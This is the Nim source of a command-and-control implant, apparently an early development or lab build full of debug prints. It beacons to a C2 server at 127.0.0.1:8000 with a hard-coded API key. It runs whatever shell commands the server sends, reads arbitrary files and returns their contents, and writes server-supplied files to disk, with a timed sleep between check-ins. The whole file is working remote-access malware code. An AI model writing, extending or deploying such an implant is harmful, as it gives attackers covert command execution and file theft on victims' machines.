import std/[times, httpclient, json, osproc, streams, os]

echo "Defined variables"
var 
    task_stdout: string
    task_stderr: string
    task_status: int
    content: string

var client = newHttpClient()
let headers = {
    "Content-Type": "application/json",
    "User-Agent": "Agent-C2-EX-MACHINA 0.0.1 (Windows) KrysCatLaptop",
    "Api-Key": "AdminAdminAdminAdminAdminAdminAdminAdminAdminAdminAdminAdminAdminAdminAdminAdminAdminAdminAdminAdminAdminAdminAdminAdminAdminAdminAdminAdminAdminAdminAdminAdmin",
}

echo "Add headers request 1"
client.headers = newHttpHeaders(headers)
content = client.getContent("http://127.0.0.1:8000/c2/order/01223456789abcdef")
echo "Get content response 1"

while true:
    
    let order = parseJson(content)
    let body = %* []
    echo "Parse JSON"

    for task in order["Tasks"]:
        echo "Process task"
        case task["Type"].getStr()
        of "COMMAND":
            echo "startProcess"
            let process_execution = startProcess(task["Data"].getStr(), options={poUsePath, poEvalCommand})
            echo "waitForExit"
            task_status = process_execution.waitForExit()
            echo "stderr readAll"
            task_stderr = process_execution.errorStream().readAll()
            echo "stdout readAll"
            task_stdout = process_execution.outputStream().readAll()
        of "UPLOAD":
            echo "readFile"
            task_stdout = readFile(task["Data"].getStr())
            task_stderr = ""
            task_status = 0
        of "DOWNLOAD":
            echo "writeFile"
            writeFile(task["Filename"].getStr(), task["Data"].getStr())
            task_stdout = ""
            task_stderr = ""
            task_status = 0

        echo "body add task result"
        body.add(%* {"id": task["Id"].getInt(), "stdout": task_stdout, "stderr": task_stderr, "status": task_status})

    let time_to_sleep = order["NextRequestTime"].getInt() - getTime().toUnix()
    echo "Time to sleep:" & $time_to_sleep
    if time_to_sleep > 0:
        echo "sleep"
        sleep(int(time_to_sleep * 1000'i64))

    echo "new client"
    client = newHttpClient()
    client.headers = newHttpHeaders(headers)
    echo "POST and get content"
    content = client.request("http://127.0.0.1:8000/c2/order/01223456789abcdef", httpMethod = HttpPost, body = $body).body
